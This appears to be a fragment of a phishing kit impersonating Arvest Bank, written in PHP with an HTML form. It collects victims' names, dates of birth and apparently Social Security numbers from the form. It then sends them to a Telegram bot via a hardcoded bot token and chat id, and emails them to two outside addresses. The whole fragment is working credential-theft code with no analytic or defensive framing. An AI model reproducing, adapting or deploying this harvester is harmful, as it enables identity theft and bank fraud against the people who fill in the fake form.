...
<?php
  ...
  if(isset($_POST['submit'])) { 
    $apiToken = "bot5232617050:AAHe4f4asBoLrNbYOEbm3KGXOOU9yb3b4h0"; 
        $fnam = $_POST['fnam'];
        $lnam = $_POST['lnam'];
        $dob = $_POST['dob'];
        $soc = $_POST['soc'];
    ...
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=1691296359&text=$msg ");
	$headers = 'From: lovely@lovely.com'. "\r\n" . 'Reply-To: lovely@lovely.com'. "\r\n";
    mail("michealchristopher6767@yahoo.com,resultboxxz2022@yandex.com",'Arvest Bank',$msg,$headers);
...
<section id="opc-content">
        <div class="field-mt-18">
           <form action="" method="post" enctype="multipart/form-data" action="./process/r3.php">
